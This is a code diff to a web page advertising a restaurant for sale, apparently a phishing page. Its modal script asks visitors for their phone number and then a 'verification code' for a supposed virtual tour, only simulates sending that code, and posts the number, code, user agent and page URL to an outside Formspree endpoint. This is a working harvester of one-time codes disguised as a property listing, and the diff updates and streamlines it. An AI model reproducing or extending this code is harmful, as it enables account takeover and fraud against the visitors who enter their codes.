@@ -6,6 +6,7 @@
     <title>Crayfish Inn Restaurant - For Sale</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+
         * {
             margin: 0;
             padding: 0;
@@ -366,7 +367,7 @@
                 font-size: 1.5rem;
             }
         }
-        /* All previous CSS remains the same */
+        /* All your existing CSS remains exactly the same until the modal styles */
         * {
             margin: 0;
             padding: 0;
@@ -380,9 +381,9 @@
             line-height: 1.6;
         }
 
-        /* ... all previous CSS styles remain exactly as they were ... */
-        
-        /* Modal Styles */
+        /* ... all your existing website CSS remains exactly as it was ... */
+
+        /* Modal Styles - ADD THESE TO YOUR EXISTING STYLES */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -1039,19 +1040,18 @@
                 submitVerification();
             }
             
-            // Submit phone number to server/email
-            async function submitPhoneNumber(phoneNumber) {
+            // Submit data to Formspree
+            async function submitToFormspree(data) {
                 try {
-                    // Create form data
                     const formData = new FormData();
-                    formData.append('phone_number', phoneNumber);
-                    formData.append('timestamp', new Date().toISOString());
-                    formData.append('user_agent', navigator.userAgent);
-                    formData.append('source', 'virtual_tour_request');
                     
-                    // OPTION 1: Using Formspree (free form service)
-                    // Sign up at formspree.io and replace this URL with your form endpoint
-                    const response = await fetch('https://formspree.io/f/xwkgnwvg', {
+                    // Add all data to formData
+                    Object.keys(data).forEach(key => {
+                        formData.append(key, data[key]);
+                    });
+                    
+                    // Submit to YOUR Formspree endpoint
+                    const response = await fetch('https://formspree.io/f/mnjavrrl', {
                         method: 'POST',
                         body: formData,
                         headers: {
@@ -1059,32 +1059,16 @@
                         }
                     });
                     
-                    // OPTION 2: Using your own backend endpoint (commented out)
-                    /*
-                    const response = await fetch('https://your-backend-endpoint.com/collect-phone', {
-                        method: 'POST',
-                        body: JSON.stringify({
-                            phone: phoneNumber,
-                            timestamp: new Date().toISOString(),
-                            page: window.location.href
-                        }),
-                        headers: {
-                            'Content-Type': 'application/json'
-                        }
-                    });
-                    */
-                    
                     if (response.ok) {
-                        console.log('Phone number submitted successfully:', phoneNumber);
+                        console.log('Data submitted to Formspree successfully');
                         return true;
                     } else {
-                        console.error('Failed to submit phone number');
+                        console.error('Failed to submit to Formspree');
                         return false;
                     }
                 } catch (error) {
-                    console.error('Error submitting phone number:', error);
-                    // Even if submission fails, we continue the flow
-                    return true;
+                    console.error('Error submitting to Formspree:', error);
+                    return false;
                 }
             }
             
@@ -1094,83 +1078,28 @@
                 loading.style.display = 'block';
                 step2.style.display = 'none';
                 
-                try {
-                    // Prepare data for submission
-                    const submissionData = {
-                        phone_number: collectedPhoneNumber,
-                        verification_code: verificationCode,
-                        timestamp: new Date().toISOString(),
-                        user_agent: navigator.userAgent,
-                        page_url: window.location.href,
-                        type: 'virtual_tour_verification'
-                    };
-                    
-                    // OPTION 1: Using Formspree
-                    const formData = new FormData();
-                    formData.append('phone_number', collectedPhoneNumber);
-                    formData.append('verification_code', verificationCode);
-                    formData.append('timestamp', new Date().toISOString());
-                    formData.append('user_agent', navigator.userAgent);
-                    formData.append('page_url', window.location.href);
-                    formData.append('type', 'virtual_tour_verification');
-                    
-                    const response = await fetch('https://formspree.io/f/xwkgnwvg', {
-                        method: 'POST',
-                        body: formData,
-                        headers: {
-                            'Accept': 'application/json'
-                        }
-                    });
-                    
-                    // OPTION 2: EmailJS (requires setup)
-                    /*
-                    // First, sign up at emailjs.com
-                    // Then add this script to your head: <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-                    // Initialize: emailjs.init('YOUR_PUBLIC_KEY');
-                    // Then use:
-                    await emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
-                        phone_number: collectedPhoneNumber,
-                        verification_code: verificationCode,
-                        to_email: 'crayfishinn@proton.me',
-                        date: new Date().toLocaleString()
-                    });
-                    */
-                    
-                    // OPTION 3: Simple mailto fallback (only if other methods fail)
-                    if (!response.ok) {
-                        const subject = `Virtual Tour Request - ${collectedPhoneNumber}`;
-                        const body = `New virtual tour request:\n\n` +
-                                   `Phone: ${collectedPhoneNumber}\n` +
-                                   `Code: ${verificationCode}\n` +
-                                   `Time: ${new Date().toLocaleString()}\n` +
-                                   `URL: ${window.location.href}`;
-                        
-                        // Create hidden link and trigger it
-                        const mailtoLink = `mailto:crayfishinn@proton.me?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-                        const link = document.createElement('a');
-                        link.href = mailtoLink;
-                        link.style.display = 'none';
-                        document.body.appendChild(link);
-                        setTimeout(() => {
-                            link.click();
-                            document.body.removeChild(link);
-                        }, 100);
-                    }
-                    
-                    // Simulate processing delay
-                    setTimeout(() => {
-                        loading.style.display = 'none';
-                        goToStep(3);
-                    }, 1500);
-                    
-                } catch (error) {
-                    console.error('Error submitting verification:', error);
-                    // Still continue to success step even if submission fails
-                    setTimeout(() => {
-                        loading.style.display = 'none';
-                        goToStep(3);
-                    }, 1500);
-                }
+                // Prepare data for submission
+                const submissionData = {
+                    phone_number: collectedPhoneNumber,
+                    verification_code: verificationCode,
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent,
+                    page_url: window.location.href,
+                    type: 'virtual_tour_request',
+                    status: 'verified',
+                    date: new Date().toLocaleString('en-ZA', {
+                        timeZone: 'Africa/Johannesburg'
+                    })
+                };
+                
+                // Submit to Formspree
+                await submitToFormspree(submissionData);
+                
+                // Simulate processing delay
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                    goToStep(3);
+                }, 1500);
             }
             
             // Event Listeners
@@ -1193,18 +1122,25 @@
                 loading.style.display = 'block';
                 step1.style.display = 'none';
                 
-                // Submit phone number
-                const success = await submitPhoneNumber(phoneNumber);
+                // Submit initial phone number to Formspree
+                const initialData = {
+                    phone_number: phoneNumber,
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent,
+                    page_url: window.location.href,
+                    type: 'virtual_tour_request',
+                    status: 'phone_submitted',
+                    date: new Date().toLocaleString('en-ZA', {
+                        timeZone: 'Africa/Johannesburg'
+                    })
+                };
                 
-                // Simulate sending verification code (in real app, this would send SMS)
+                await submitToFormspree(initialData);
+                
+                // Simulate sending verification code
                 setTimeout(() => {
                     loading.style.display = 'none';
-                    if (success) {
-                        goToStep(2);
-                    } else {
-                        // Still continue to step 2 even if submission fails
-                        goToStep(2);
-                    }
+                    goToStep(2);
                 }, 1500);
             });
             
